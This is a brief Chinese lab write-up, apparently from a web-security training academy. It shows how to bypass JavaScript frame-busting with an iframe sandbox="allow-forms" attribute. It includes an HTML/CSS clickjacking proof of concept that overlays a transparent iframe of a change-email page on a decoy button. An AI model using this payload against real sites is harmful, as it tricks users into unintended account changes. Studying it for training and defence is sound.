页面使用javascript脚本对页面进行了限制：

![](images/24DE6EDA96B748448B3E6FC505F84AFBclipboard.png)

使页面不能够iframe化



但是这个方法存在绕过，可以使用 iframe标签的sandbox="allow-forms" 属性进行绕过



poc:

```javascript
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:450px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://ac761fae1ef30c8d80f54ea2004e0051.web-security-academy.net/email?email=111@qq.com" sandbox="allow-forms"></iframe>
```

